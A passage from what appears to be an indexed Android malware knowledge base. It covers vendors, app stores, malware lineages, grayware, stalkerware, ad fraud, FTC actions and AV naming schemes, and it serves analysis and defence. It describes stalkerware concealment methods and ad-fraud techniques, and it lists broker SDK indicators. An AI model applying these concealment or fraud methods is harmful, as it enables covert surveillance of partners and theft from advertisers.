Acquired by Thoma Bravo. MOBILedit Forensic Express Mobile phone examination and data extraction. MSAB XRY Swedish mobile forensics. Logical and physical extraction. Oxygen Forensics Detective Cloud data extraction, mobile device forensics."},{"location":"industry/security-companies/#packer-protection-vendors","title":"Packer / Protection Vendors","text":"<p>Companies selling Android app protection. Documented in Packers.</p> Company Product Origin Baidu Baidu Reinforcement China Bangcle SecNeo China Digital.ai (formerly Arxan) App Protection USA Guardsquare DexGuard Belgium iJiami iJiami China Licel DexProtector Netherlands Nagain / APKProtect APKProtect China NetEase NeteaseYiDun China Promon Promon SHIELD Norway Qihoo 360 360 Jiagu China SenseShield Virbox Protector China Tencent Legu China"},{"location":"industry/security-companies/#app-distribution-third-party-stores","title":"App Distribution / Third-Party Stores","text":"<p>Alternative distribution channels outside Google Play. Relevant because malware distribution increasingly uses these channels and sideloading.</p> Store/Platform Region Notes 360 Mobile Assistant China Qihoo 360's store. Amazon Appstore Global Ships with Fire devices. Available on standard Android. APKMirror Global APK hosting. More curated than APKPure. Focused on original developer uploads. Apkada Russia/CIS Russian-language store. APKPure Global APK download site. Users sideload from here. Itself was compromised with malware in 2021. Aptoide Global Third-party marketplace. Community-driven. Used by legitimate apps and malware alike. Baidu Mobile Assistant China Baidu's app store. CafeBazaar Iran Dominant Iranian Android store. 40M+ users. Google Play Global Official store. Play Protect scanning. Droppers still get through regularly. Huawei AppGallery Global (Huawei devices) Second-largest Android store. Own review process. Used for regional malware distribution. OPPO App Market China/Global Pre-installed on OPPO/OnePlus. Samsung Galaxy Store Global (Samsung devices) Samsung's store. Less strict review than Play Store historically. Tencent MyApp (Yingyongbao) China Major Chinese Android store. Vivo App Store China/Global Pre-installed on Vivo devices. Xiaomi GetApps China/Global Pre-installed on Xiaomi devices. <p>In China, Google Play is unavailable. Users install apps from OEM stores (Tencent, Baidu, Xiaomi, etc.), making these stores primary distribution channels for both legitimate apps and malware targeting Chinese users.</p>"},{"location":"industry/security-companies/#apk-modding-cracking-scene","title":"APK Modding / Cracking Scene","text":"<p>Modified APKs (mods) distributed through forums and dedicated sites. Relevant because modded APKs are a malware distribution vector: trojans are injected into popular cracked apps.</p> Platform Type Notes ACMarket Modded app store Distributes modified APKs. Known malware distribution vector. An1.com Modded games Modded Android game distribution. HappyMod Modded app store Modded game APKs. Community uploads. Lucky Patcher Modification tool In-app purchase bypass, ad removal, permission modification. Widely used. Mobilism Forum + APK sharing Cracked/modded APK distribution. Active community. <p>Modded APKs are frequently repackaged with additional payloads (adware, spyware, banking trojans). The user installs a \"cracked\" version of a game or premium app and gets malware bundled in.</p>"},{"location":"malware/","title":"Android Malware","text":"<p>The Android malware landscape from its earliest trojans to modern banking malware with full device takeover. This section documents how Android malware works, how it evolved, and the techniques that define each generation.</p>"},{"location":"malware/#structure","title":"Structure","text":"Page Content Timeline Chronological evolution of Android malware: key families, milestones, how techniques spread Naming Conventions How different security vendors name the same malware, and how to map between naming schemes Grayware &amp; Data Harvesting Data broker SDKs, stalkerware, ad fraud, fleeceware, predatory lending apps -- the gray area between aggressive monetization and malware Threat Actors MaaS operators, state-sponsored groups, regional criminal organizations, and solo developers behind Android malware Families Individual write-ups on notable malware families: behaviors, permissions, techniques, packers, IOCs"},{"location":"malware/#landscape-overview","title":"Landscape Overview","text":""},{"location":"malware/#by-category","title":"By Category","text":"Category Count Description Banking trojans (MaaS) 25+ Overlay attacks, ATS, VNC/DTO. Sold as subscriptions ($3k-$10k/month) Regional bankers 10+ Single-country targeting with local financial system knowledge SMS/toll fraud 5+ Premium SMS, WAP billing, subscription fraud Spyware/surveillance 15+ State-sponsored and commercial. Targeted deployment RATs 5+ General-purpose remote access. Builder-based or open-source Supply chain 3+ Malicious SDKs, compromised apps. Mass installs via Play Store Crypto stealers 3+ OCR seed phrase theft, clipboard hijacking"},{"location":"malware/#major-lineages","title":"Major Lineages","text":"<p>Android malware families frequently share code through source leaks, MaaS rebranding, and direct evolution:</p> <pre><code>Cerberus (2019) \u2500\u2500leak\u2500\u2500&gt; Alien (2020) \u2500\u2500fork\u2500\u2500&gt; Ermac (2020) \u2500\u2500evolve\u2500\u2500&gt; Hook (2022)\n\nBankBot (2016) \u2500\u2500influence\u2500\u2500&gt; Anubis (2018) \u2500\u2500leak\u2500\u2500&gt; GodFather (2022)\n\nExobot (2016) \u2500\u2500&gt; ExobotCompact \u2500\u2500&gt; Coper \u2500\u2500&gt; Octo (2022) \u2500\u2500&gt; Octo2 (2024)\n\nGM Bot (2014) \u2500\u2500leak\u2500\u2500&gt; spawned overlay technique adopted industry-wide\n\nBRATA (2019) \u2500\u2500evolve\u2500\u2500&gt; Copybara (2021) \u2500\u2500&gt; ToxicPanda (2024)\n\nCraxRAT \u2500\u2500&gt; SpySolr \u2500\u2500&gt; BTMOB RAT (2025)\n</code></pre>"},{"location":"malware/#2024-2025-trends","title":"2024-2025 Trends","text":"Trend Examples Reduced permission footprints Medusa v2 dropped from 21 to 5 permissions NFC relay attacks NGate, RatOn clone contactless payment cards OCR-based crypto theft SparkCat, SpyAgent scan photos for seed phrases Commercial packer adoption Klopatra, Gigabud use Virbox for anti-analysis On-device virtualization GodFather v3 installs real banking apps inside VirtualApp sandbox Fake lockscreen PIN capture TrickMo, TsarBot steal device PINs via fake lockscreens Human behavior mimicry Herodotus types with natural delays to evade behavioral biometrics Firebase as C2 KoSpy, FireScam, DeVixor use Firebase infrastructure"},{"location":"malware/#geographic-hotspots","title":"Geographic Hotspots","text":"Region Dominant Families Distribution Europe (Western) Anatsa, Octo, Medusa, Vultur Play Store droppers Europe (Southern) Copybara, Sturnus, Herodotus Vishing (TOAD), smishing Turkey Frogblight, BlankBot, Klopatra Smishing, phishing pages Russia/CIS Mamont, FireScam Fake parcel tracking, fake RuStore Iran DeVixor, DCHSpy Fake VPN apps, automotive phishing South Korea Fakecalls, SoumniBot, SpyAgent Smishing, fake banking apps East Asia MoqHao, FluHorse Smishing (Roaming Mantis), trojanized apps Southeast Asia Gigabud, GoldPickaxe Fake government/banking apps Latin America PixPirate, ToxicPanda, Zanubis WhatsApp lures, social engineering Middle East GuardZoo, AridSpy Trojanized messaging apps"},{"location":"malware/#by-behavior","title":"By Behavior","text":"<p>Malware families are also cross-referenced from Attack Techniques based on observed behaviors: overlay attacks, accessibility abuse, SMS interception, NFC relay, etc. Permission pages document which families abuse each Android permission.</p>"},{"location":"malware/grayware/","title":"Grayware &amp; Data Harvesting","text":"<p>The boundary between aggressive monetization and spyware is not a line but a gradient. Grayware encompasses apps that are not classified as malware by most engines but engage in systematic data collection, user tracking, deceptive billing, or surveillance capabilities sold as legitimate products. AV engines flag these as PUP (Potentially Unwanted Program) or riskware. For analysts, the question \"is this malware?\" often lands here, and the answer depends on jurisdiction, intent, and how much you trust a privacy policy written by a data broker's lawyer.</p>"},{"location":"malware/grayware/#data-broker-sdks","title":"Data Broker SDKs","text":"<p>Third-party SDKs embedded in otherwise legitimate apps that silently collect and sell user data. The app developer integrates the SDK in exchange for per-device-per-month payments. The SDK harvests device data in the background. The data flows to brokers, advertisers, and in documented cases, government agencies.</p>"},{"location":"malware/grayware/#how-sdk-monetization-works","title":"How SDK Monetization Works","text":"<ol> <li>SDK vendor approaches app developer with monetization offer</li> <li>Developer integrates SDK (usually a few lines in Gradle + manifest entries)</li> <li>SDK activates on app launch, begins collecting permitted data</li> <li>Data uploaded to SDK vendor's servers on a schedule or in real time</li> <li>Vendor aggregates data across all apps embedding their SDK</li> <li>Aggregated datasets sold to data brokers, analytics firms, advertisers, and government contractors</li> <li>Developer receives payment based on active device count (typically $0.01-$0.05 per device per month)</li> </ol>"},{"location":"malware/grayware/#what-they-collect","title":"What They Collect","text":"Data Type Method Notes GPS location (continuous) <code>ACCESS_FINE_LOCATION</code> / <code>ACCESS_BACKGROUND_LOCATION</code> High-frequency polling, often every few minutes WiFi SSIDs and BSSIDs WiFi scan APIs Enables indoor positioning and location inference without GPS Bluetooth beacons Bluetooth scan APIs Proximity detection, retail analytics Installed apps list <code>QUERY_ALL_PACKAGES</code> or <code>PackageManager</code> App usage profiling, interest inference Device identifiers AAID, IMEI (pre-Android 10), MAID Cross-app and cross-device tracking Contacts <code>READ_CONTACTS</code> Social graph mapping Accelerometer / gyroscope Sensor APIs Activity recognition, transport mode detection Browsing history Accessibility service or custom browser SDK Interest profiling"},{"location":"malware/grayware/#documented-cases","title":"Documented Cases","text":"<p>X-Mode (now Outlogic): Collected location data from 400+ apps including Muslim prayer apps (Muslim Pro, Muslim Mingle) and dating apps. Data sold to US military contractors and defense agencies. The Wall Street Journal exposed the pipeline in 2020. Google and Apple required X-Mode removal from all apps in early 2021. X-Mode rebranded to Outlogic and was acquired by Digital Envoy.</p> <p>Measurement Systems SDK: Discovered by AppCensus researchers in 60M+ downloads across weather apps, highway radar apps, QR scanners, and religious apps. The SDK collected phone numbers, email addresses, exact location, nearby WiFi and Bluetooth device information, and clipboard contents. Registered to a Virginia company (Vostrom Holdings) linked to a US defense contractor (Packet Forensics) with a history of selling lawful intercept equipment to governments. Google removed the SDK from Play Store in April 2022, but some apps reintegrated it later.</p> <p>Patternz: Israeli surveillance company (run by ISA, Nuviad's parent) using SDK data from popular apps for intelligence purposes. Patternz's pitch deck claimed access to data from 600,000 apps, enabling tracking of nearly any mobile user globally. ISA operated a legitimate ad network (Nuviad) that served as the data collection front.</p> <p>Predicio / Gravy Analytics: French data broker Predicio and US-based Gravy Analytics collected location data through SDK partnerships and the real-time bidding (RTB) ad ecosystem. Gravy Analytics was hacked in January 2025, exposing location data for millions of devices globally. The leaked data included coordinates from apps like Tinder, Grindr, Candy Crush, and various pregnancy tracking apps.</p>"},{"location":"malware/grayware/#sdk-identification","title":"SDK Identification","text":"<p>When analyzing a suspect app, identify embedded SDKs through:</p> Indicator Location Package names <code>com.xmode.sdk</code>, <code>io.huq</code>, <code>com.cuebiq</code>, <code>com.safegraph</code>, <code>com.predicio</code>, <code>com.tutela</code>, <code>com.measurementsys</code> Manifest receivers/services Look for services not attributable to the app's core functionality Network traffic Connections to <code>api.xmode.io</code>, <code>sdk.huq.io</code>, <code>ingest.cuebiq.com</code>, known broker endpoints Gradle dependencies Check <code>build.gradle</code> for SDK artifact references String artifacts API keys, SDK initialization tokens in resources or <code>BuildConfig</code>"},{"location":"malware/grayware/#predatory-lending-apps-spyloan","title":"Predatory Lending Apps (SpyLoan)","text":"<p>Apps offering quick microloans that demand excessive permissions, then weaponize collected data for extortion when borrowers cannot repay. Detailed technical analysis in the dedicated family page: SpyLoan.</p>"},{"location":"malware/grayware/#business-model","title":"Business Model","text":"<ol> <li>Target users in regions with limited formal banking access (India, Southeast Asia, Latin America, Africa)</li> <li>Offer instant loan approval through Google Play apps with polished UI</li> <li>Request contacts, camera, SMS, location, storage during \"verification\"</li> <li>Approve microloans at 300-500% APR with hidden fees</li> <li>When borrowers miss payments: contact their entire phone book with threatening messages, share personal photos, send fake legal notices to employers</li> <li>Data exfiltration begins immediately on permission grant, retained server-side even if app is uninstalled</li> </ol>"},{"location":"malware/grayware/#scale-and-impact","title":"Scale and Impact","text":"<p>Google removed 2000+ SpyLoan apps from Play Store between 2023 and 2024. Targeting concentrates in India, Philippines, Indonesia, Kenya, Nigeria, Mexico, and Colombia. Documented suicide cases linked to SpyLoan harassment campaigns in India, the Philippines, and Kenya. McAfee reported a 75% increase in SpyLoan infections between Q2 and Q3 2024.</p>"},{"location":"malware/grayware/#stalkerware-spouseware","title":"Stalkerware / Spouseware","text":"<p>Commercial surveillance apps marketed for \"parental monitoring\" or \"employee tracking\" but predominantly used for intimate partner surveillance. These are sold openly with customer support, subscription billing, and terms of service, yet provide capabilities identical to state-sponsored spyware.</p>"},{"location":"malware/grayware/#major-stalkerware-products","title":"Major Stalkerware Products","text":"Product Price Status mSpy $30-70/month Active, one of the largest operators FlexiSpy $70-200/month Active, premium tier with call interception Cocospy / Spyic $40-50/month Active, same parent company (1TopSpy) TheTruthSpy $20-30/month Breached in 2022, 60GB of victim photos/data exposed pcTattletale $100/year Hacked and shut down in 2024 LetMeSpy Free-$6/month Breached and shut down in 2023 SpyFone ~$100/year Banned by FTC in 2021"},{"location":"malware/grayware/#technical-capabilities","title":"Technical Capabilities","text":"Capability Implementation Real-time GPS tracking Background location service with ACCESS_BACKGROUND_LOCATION Call recording Audio recording during calls via RECORD_AUDIO SMS/MMS reading READ_SMS content provider monitoring Social media monitoring Accessibility service reads screen content from WhatsApp, Instagram, Snapchat Ambient microphone Silent RECORD_AUDIO activation on command Keylogging Accessibility service captures all text input Screenshot capture Screen capture at intervals or on demand Browser history Read browser content providers or accessibility scraping Camera capture Silent CAMERA activation"},{"location":"malware/grayware/#installation-and-concealment","title":"Installation and Concealment","text":"<p>Requires physical access to the target device. Installers guide the abuser through disabling Play Protect, enabling unknown sources, granting all permissions, then activating device administrator. After installation:</p> <ul> <li>App icon hidden from launcher (removed from <code>CATEGORY_LAUNCHER</code>)</li> <li>Process name disguised as system component (\"System Service\", \"Battery Optimizer\", \"Sync Service\")</li> <li>Runs as a foreground service with a blank or misleading notification</li> <li>Registered as device administrator to resist uninstallation</li> <li>RECEIVE_BOOT_COMPLETED for persistence across reboots</li> </ul>"},{"location":"malware/grayware/#detection","title":"Detection","text":"<ul> <li>Hidden accessibility services with generic names</li> <li>Elevated battery consumption from continuous location and sensor polling</li> <li>Background data usage to stalkerware C2 servers</li> <li>Device administrator registered to unknown app</li> <li>Coalition Against Stalkerware maintains detection signatures shared with AV vendors</li> <li>Check <code>Settings &gt; Accessibility &gt; Installed Services</code> for unknown entries</li> <li>Check <code>Settings &gt; Security &gt; Device admin apps</code> for apps not installed by user</li> </ul>"},{"location":"malware/grayware/#data-breaches","title":"Data Breaches","text":"<p>Stalkerware companies are frequent breach targets because they store massive datasets of intimate victim data with poor security:</p> <ul> <li>TheTruthSpy (2022): 60GB of victim photos, audio recordings, and messages exposed</li> <li>LetMeSpy (2023): Entire database leaked, company shut down</li> <li>pcTattletale (2024): Hacked, data exposed, company permanently closed</li> <li>SpyFone (2021): FTC ordered data deletion, banned from surveillance industry</li> <li>mSpy (2015, 2018): Breached twice, millions of customer records exposed</li> </ul>"},{"location":"malware/grayware/#advertising-fraud","title":"Advertising Fraud","text":"<p>Apps that generate fake ad impressions, clicks, or installs in the background to steal advertising revenue. Not data theft but device abuse at the expense of battery, bandwidth, and advertiser budgets.</p>"},{"location":"malware/grayware/#fraud-types","title":"Fraud Types","text":"Type Mechanism Detection Signal Click injection Listens for <code>PACKAGE_ADDED</code> broadcast, injects attribution click before new app finishes installing <code>PACKAGE_ADDED</code> receiver + immediate HTTP request to attribution URL Ad stacking Multiple invisible ads loaded behind a single visible ad Multiple ad SDK network calls per visible impression Pixel stuffing Ads loaded in 1x1 pixel containers, invisible to user Tiny WebView or ImageView with ad network traffic Background ad rendering Hidden WebView loads and \"views\" ads with screen off WebView activity without corresponding UI, battery drain Click flooding Mass generation of fake ad clicks to poison attribution data High-volume HTTP requests to ad tracking endpoints SDK spoofing Forge ad impressions by replaying legitimate SDK traffic patterns Network traffic mimicking ad SDK protocols without actual ad display"},{"location":"malware/grayware/#notable-cases","title":"Notable Cases","text":"<p>DrainerBot (2019): SDK embedded in 10M+ downloads that downloaded video ads in the background, consuming 10GB+ of mobile data per month per device. Users experienced massive data charges and battery drain with no visible cause.</p> <p>Tekya (2020): Auto-clicker malware in 56 Google Play apps (24 children's apps). Used <code>MotionEvent</code> API to simulate legitimate ad clicks. Check Point documented the use of Android's <code>MotionEvent.obtain()</code> to generate touch events programmatically.</p> <p>Chamois (2017-2019): Google-discovered ad fraud botnet pre-installed in firmware on 21M+ devices. Operated through the supply chain, with malicious code embedded during manufacturing. Generated fraudulent ad revenue through background ad clicks and premium SMS.</p> <p>Judy (2017): Ad click malware in 41 apps from a Korean developer on Google Play. Used a C2 server to deliver JavaScript payloads that clicked ads via WebView. Estimated 8.5M-36.5M infected devices.</p>"},{"location":"malware/grayware/#technical-indicators","title":"Technical Indicators","text":"<ul> <li><code>PACKAGE_ADDED</code> broadcast receiver (click injection vector)</li> <li><code>MotionEvent.obtain()</code> or <code>dispatchTouchEvent()</code> calls without user interaction</li> <li>Hidden or zero-dimension <code>WebView</code> instances</li> <li>Abnormal battery drain and background data consumption</li> <li>Ad SDK network traffic volume disproportionate to app usage</li> <li>Wake locks held during screen-off periods for background rendering</li> </ul>"},{"location":"malware/grayware/#fleeceware","title":"Fleeceware","text":"<p>Apps that exploit free trial mechanics and subscription billing to charge excessive fees for minimal functionality.</p>"},{"location":"malware/grayware/#pattern","title":"Pattern","text":"<ol> <li>Offer a \"free trial\" (typically 3 days) requiring payment method entry</li> <li>Auto-renew at $30-$200/week for commodity functionality (flashlight, QR scanner, wallpaper, horoscope)</li> <li>Make cancellation deliberately confusing: uninstalling the app does not cancel the subscription</li> <li>Target users unfamiliar with app store subscription management</li> <li>Use misleading UI that obscures the subscription cost or implies the trial is truly free</li> </ol>"},{"location":"malware/grayware/#scale","title":"Scale","text":"<p>Avast identified 200+ fleeceware apps with 1B+ combined downloads in 2020. Sophos coined the term \"fleeceware\" in 2019 after finding apps charging $100+/month for basic calculator and QR scanner functionality. Apple and Google have both tightened trial disclosure requirements in response, but enforcement remains inconsistent.</p>"},{"location":"malware/grayware/#technical-indicators_1","title":"Technical Indicators","text":"<ul> <li>Short trial period (1-3 days) followed by high weekly/monthly charge</li> <li>Minimal app functionality relative to subscription cost</li> <li>Subscription initiation flow that obscures pricing</li> <li>In-app purchase / subscription APIs invoked immediately during onboarding</li> <li>No meaningful feature gating between free and paid tiers</li> </ul>"},{"location":"malware/grayware/#riskware-dual-use-apps","title":"Riskware / Dual-Use Apps","text":"<p>Legitimate apps with capabilities that can be -- or have been -- repurposed for surveillance, data harvesting, or abuse.</p>"},{"location":"malware/grayware/#documented-cases_1","title":"Documented Cases","text":"<p>VPN apps selling browsing data: Sensor Tower, an analytics company, operated at least 20 VPN and ad-blocker apps (including Luna VPN and AdBlock Focus) to collect app usage data from millions of users. The apps required root certificate installation, giving Sensor Tower visibility into all network traffic. BuzzFeed News exposed this in 2020.</p> <p>Keyboard apps exfiltrating keystrokes: ai.type, a popular custom keyboard with 40M+ downloads, was found sending keystroke data including passwords to remote servers. A 2017 breach of ai.type's unprotected database exposed personal data of 31M users including phone numbers, device details, and typing patterns.</p> <p>File manager apps harvesting data: Several Chinese-developed file manager apps on Google Play (File Manager by sharkApp, File Recovery &amp; Data Recovery) were found by Pradeo exfiltrating contacts, device location, photos, audio, and network information to servers in China despite claiming no data collection in their Play Store listings.</p> <p>Free antivirus as data collection: DU Antivirus (by Baidu spin-off DU Group) collected device data, installed app lists, and call logs, then sold aggregated data. 10M+ installs before removal. Multiple free AV apps on Play Store operate primarily as data collection platforms with minimal actual detection capability.</p> <p>Utility apps with unnecessary permissions: Flashlight apps requesting camera, microphone, contacts, and location permissions. The permissions serve no function within the app's stated purpose but enable data harvesting.</p>"},{"location":"malware/grayware/#analysis-approach","title":"Analysis Approach","text":"<p>When investigating a sample flagged as PUP, riskware, or suspected grayware:</p>"},{"location":"malware/grayware/#permission-audit","title":"Permission Audit","text":"<p>Compare the app's requested permissions against its stated functionality. A weather app requesting READ_CONTACTS and READ_SMS is a red flag. Use the permissions section for detailed analysis of each permission's abuse potential.</p>"},{"location":"malware/grayware/#network-traffic-analysis","title":"Network Traffic Analysis","text":"<p>Intercept outbound connections and look for:</p> Signal Indicates Connections to known data broker domains SDK-based data harvesting Large POST requests containing device/user data Data exfiltration Periodic beaconing with device identifiers Tracking SDK activity Connections to ad networks without visible ads Ad fraud TLS certificate pinning on non-app-core endpoints Attempt to hide SDK traffic from analysis"},{"location":"malware/grayware/#sdk-identification_1","title":"SDK Identification","text":"<p>After decompilation, check for embedded third-party SDKs:</p> Check Method Package names Search for known broker SDK package prefixes in smali/classes Manifest components Services and receivers not attributable to the app's core function String constants API keys, SDK version strings, initialization tokens Network endpoints Hardcoded URLs pointing to broker/analytics infrastructure Gradle dependencies <code>build.gradle</code> references to SDK artifacts (if source available)"},{"location":"malware/grayware/#data-flow-tracking","title":"Data Flow Tracking","text":"<p>Trace how permission-protected data moves from acquisition to network transmission:</p> <ol> <li>Identify all <code>ContentResolver.query()</code> calls for contacts, SMS, call log</li> <li>Follow data through local processing and serialization</li> <li>Identify the network call that transmits the data</li> <li>Determine destination: is it the app's own backend or a third-party SDK endpoint?</li> </ol>"},{"location":"malware/grayware/#known-data-broker-domains","title":"Known Data Broker Domains","text":"<p>Domains associated with data harvesting SDKs, useful for network traffic filtering during analysis.</p> Domain Pattern Associated Entity Data Type <code>*.xmode.io</code> X-Mode / Outlogic Location <code>*.huq.io</code> Huq Industries Location, footfall <code>*.cuebiq.com</code> Cuebiq Location <code>*.safegraph.com</code> SafeGraph Location, foot traffic <code>*.predic.io</code> Predicio Location <code>*.tutela.com</code> Tutela Network quality + location <code>*.measurementsys.com</code> Measurement Systems Location, PII, device data <code>*.placed.com</code> Foursquare (Placed) Location attribution <code>*.kochava.com</code> Kochava Attribution, device data <code>*.mxplay.com</code> MX Player analytics Usage, device data <code>*.gravityinsights.com</code> Gravy Analytics Location <p>This list is not exhaustive. New SDKs and broker domains emerge continuously. Cross-reference with AppCensus, Exodus Privacy, and IDAC research for updated indicators.</p>"},{"location":"malware/grayware/#legal-gray-area","title":"Legal Gray Area","text":"<p>Understanding the legal context matters for analysts because it determines how to classify and report findings.</p>"},{"location":"malware/grayware/#enforcement-actions","title":"Enforcement Actions","text":"<p>FTC vs. SpyFone (2021): FTC banned SpyFone and its CEO from the surveillance business, ordered deletion of all collected data. First FTC action banning a company from the stalkerware industry entirely.</p> <p>FTC vs. X-Mode / Outlogic (2024): FTC banned X-Mode from selling sensitive location data (near medical facilities, religious organizations, domestic violence shelters) and required deletion of previously collected data.</p> <p>FTC vs. InMarket (2024): FTC settled with data broker InMarket over selling precise geolocation data without informed consent.</p> <p>FTC vs. Avast (2024): FTC fined Avast $16.5M for selling browsing data collected through its antivirus products and browser extensions via subsidiary Jumpshot.</p>"},{"location":"malware/grayware/#google-play-policy-evolution","title":"Google Play Policy Evolution","text":"<p>Google has progressively restricted data harvesting through Play Store policy changes:</p> <ul> <li>2021: Banned X-Mode and similar location SDKs, required disclosure of all SDKs</li> <li>2022: Banned stalkerware distribution, restricted <code>QUERY_ALL_PACKAGES</code> usage</li> <li>2023: Expanded data safety section requirements, restricted background location access</li> <li>2024: Further SDK transparency requirements, restricted accessibility service use for non-accessibility purposes</li> </ul>"},{"location":"malware/grayware/#why-this-matters-for-analysts","title":"Why This Matters for Analysts","text":"<p>When a client sends a sample and asks \"is this malware?\", the answer for grayware requires context beyond technical analysis. An app collecting location data and selling it to brokers is legal in many jurisdictions if disclosed in the privacy policy, regardless of whether users actually read it. The same app collecting the same data and selling it to a military contractor may trigger different legal frameworks. An analyst's job is to document what the app does technically and let the legal and compliance teams determine the classification. The categories on this page help frame the conversation.</p>"},{"location":"malware/naming-conventions/","title":"Malware Naming Conventions","text":"<p>There is no universal naming standard for Android malware. Different security vendors independently analyze and name the same malware family, resulting in multiple names for the same threat. This makes cross-referencing research across vendors one of the most tedious parts of mobile threat intelligence.</p>"},{"location":"malware/naming-conventions/#the-problem","title":"The Problem","text":"<p>When a new Android banking trojan appears, each vendor that analyzes it assigns their own name. The name usually sticks if the vendor publishes first, but not always. Some vendors never adopt the common name and use their own detection taxonomy indefinitely.</p>"},{"location":"malware/naming-conventions/#naming-formats-by-vendor-type","title":"Naming Formats by Vendor Type","text":""},{"location":"malware/naming-conventions/#av-engine-detection-names","title":"AV Engine Detection Names","text":"<p>Traditional antivirus engines use a structured format:</p> <pre><code>Platform:Type/Family.Variant\n</code></pre> Vendor Format Example (Cerberus) Bitdefender <code>Android.Trojan.Category.XX</code> <code>Android.Trojan.Banker.VT</code> Dr.Web <code>Android.BankBot.NNNNN</code> <code>Android.BankBot.842</code> ESET <code>Android/Type.Family.XX</code> <code>Android/Spy.Cerberus.A</code> Fortinet <code>Android/Family.A!tr</code> <code>Android/Cerberus.A!tr</code> Kaspersky <code>HEUR:Trojan-Type.AndroidOS.Family.x</code> <code>HEUR:Trojan-Banker.AndroidOS.Cebruser.a</code> McAfee <code>Android/Family.X</code> <code>Android/Cerberus.A</code> Trend Micro <code>AndroidOS_Family.VARIANT</code> <code>AndroidOS_Cerberus.HRX</code> Avast/AVG <code>Android:Family-X [Trj]</code> <code>Android:Cerberus-A [Trj]</code> Symantec/Broadcom <code>Android.Trojan.Family</code> <code>Trojan.Gen.MBT</code> Sophos <code>Andr/Family-X</code> <code>Andr/Cerber-A</code> <p>These names are designed for automated detection, not human communication. They rarely match the research name used in reports. The variant suffix (<code>.A</code>, <code>.B</code>, etc.) increments per sample, not per malware version.</p>"},{"location":"malware/naming-conventions/#complete-virustotal-scanner-list","title":"Complete VirusTotal Scanner List","text":"<p>When submitting an Android APK to VirusTotal, these are all the engines that may produce a detection name. Organized by category to help interpret results.</p>"},{"location":"malware/naming-conventions/#mobile-specific-engines","title":"Mobile-Specific Engines","text":"Engine Android Detection Format Notes AhnLab-V3 <code>Trojan/Android.Banker.NNNNNN</code> Korean AV, strong on Asian malware Avast-Mobile <code>Android:Family-X [Trj]</code> Mobile-specific scanner, same family names as desktop Avast BitDefenderFalx <code>Android.Trojan.Family.XX</code> Bitdefender's mobile engine Symantec Mobile Insight <code>AppRisk:Generisk</code> or family-specific Broadcom's mobile engine, often generic Trustlook <code>Android.PUA.Family</code> Mobile-focused, behavioral detection"},{"location":"malware/naming-conventions/#major-av-engines","title":"Major AV Engines","text":"Engine Android Detection Format Notes Avast <code>Android:Family-X [Trj]</code> Shares engine with AVG AVG <code>Android:Family-X [Trj]</code> Same engine as Avast Avira (no cloud) <code>ANDROID/Family.XXXXX.X</code> Static-only results on VT BitDefender <code>Android.Trojan.Family.XX</code> Licensed by many other engines (eScan, GData, Emsisoft) ClamAV <code>Andr.Trojan.Family-NNNNNNN-0</code> Open source, often behind on mobile DrWeb <code>Android.BankBot.NNNNN</code> Uses numeric IDs, hard to cross-reference ESET-NOD32 <code>Android/Spy.Family.XX</code> Consistent naming, good mobile coverage Fortinet <code>Android/Family.A!tr</code> Suffix indicates type (!tr = trojan, !spy = spyware) GData <code>Android.Trojan.Family.XX</code> Uses Bitdefender engine Kaspersky <code>HEUR:Trojan-Banker.AndroidOS.Family.x</code> Prefix: HEUR (heuristic), UDS (cloud), PDM (behavioral) Malwarebytes <code>Android/Trojan.Banker.Family</code> Good mobile coverage McAfee Scanner <code>Artemis!HASH</code> or <code>Android/Family.X</code> \"Artemis\" = generic cloud detection Microsoft <code>Trojan:AndroidOS/Family.A!MTB</code> <code>!MTB</code> = machine learning, <code>!ml</code> = cloud ML Sophos <code>Andr/Family-X</code> Consistent prefix <code>Andr/</code> Symantec <code>Trojan.Gen.MBT</code> or <code>Android.Reputation.X</code> Often generic, poor family naming Trellix ENS <code>Artemis!HASH</code> Formerly McAfee Enterprise TrendMicro <code>AndroidOS_Family.VARIANT</code> Uppercase variant code TrendMicro-HouseCall <code>AndroidOS_Family.VARIANT</code> Same as TrendMicro WithSecure <code>Trojan:Android/Family.HASH</code> Formerly F-Secure"},{"location":"malware/naming-conventions/#edr-next-gen","title":"EDR / Next-Gen","text":"Engine Android Detection Format Notes CrowdStrike Falcon <code>AndroidOS.Family.XX</code> Behavioral, often lacks family name DeepInstinct <code>MALICIOUS</code> Binary verdict, no family name Elastic <code>Android.Trojan.Family</code> Community rules Palo Alto Networks <code>generic.ml</code> ML-based, usually no family name SentinelOne (Static ML) <code>Static AI - Malicious APK</code> Binary verdict Skyhigh (SWG) <code>BehavesLike.AndroidOS.Malware.xx</code> Behavioral prefix TEHTRIS Generic verdict No family names Trapmine Generic verdict No family names"},{"location":"malware/naming-conventions/#regional-engines","title":"Regional Engines","text":"Engine Region Android Detection Format Alibaba China <code>TrojanBanker:Android/Family.HASH</code> AliCloud China <code>TrojanBanker:Android/Family</code> Antiy-AVL China <code>Trojan/Android.Banker.family</code> Baidu China <code>Android.Trojan.Bank.XX</code> Huorong China <code>Android/Family.X</code> Jiangmin China <code>TrojanBanker.AndroidOS.xx</code> Kingsoft China <code>Android.Troj.Family.x</code> Rising China <code>Trojan.Banker/Android!version</code> Tencent China <code>A.privacy.family.x</code> AhnLab-V3 Korea <code>Trojan/Android.Family.NNNNNN</code> ALYac Korea <code>Trojan.Android.Family</code> ViRobot Korea <code>Android.Family.X</code> TACHYON Korea <code>Trojan-Android/Family</code> Bkav Pro Vietnam <code>Android.Trojan.Family</code> K7AntiVirus India <code>Trojan (XXXXXXXXXX)</code> K7GW India <code>Trojan (XXXXXXXXXX)</code> QuickHeal India <code>Android.Family.GEN</code> Ikarus Austria <code>Trojan-Banker.AndroidOS.Family</code> Zillya Ukraine <code>Trojan.Banker.Android.NNNNN</code>"},{"location":"malware/naming-conventions/#other-engines","title":"Other Engines","text":"Engine Notes Acronis (Static ML) ML-based, generic verdicts Arcabit Uses Bitdefender engine CMC Vietnam, limited mobile coverage CTX Generic detections Cynet Network-focused eScan Uses Bitdefender engine Emsisoft Uses Bitdefender engine Google Google Play Protect verdict Gridinsoft (no cloud) Limited mobile coverage Lionic Limited mobile coverage MaxSecure Limited mobile coverage NANO-Antivirus Russian, numeric detection names Panda <code>Android/Family</code> Sangfor Engine Zero Network security vendor SecureAge ML-based SUPERAntiSpyware Limited mobile coverage Arctic Wolf MDR vendor Varist <code>AndroidOS/Family</code> VBA32 Belarusian, limited mobile VIPRE Uses Bitdefender engine VirIT Italian, limited mobile Webroot Cloud-based, hash verdicts Xcitium Formerly Comodo Yandex Russian, <code>Trojan.AndroidOS.Family</code> ZoneAlarm by Check Point Uses Check Point engine 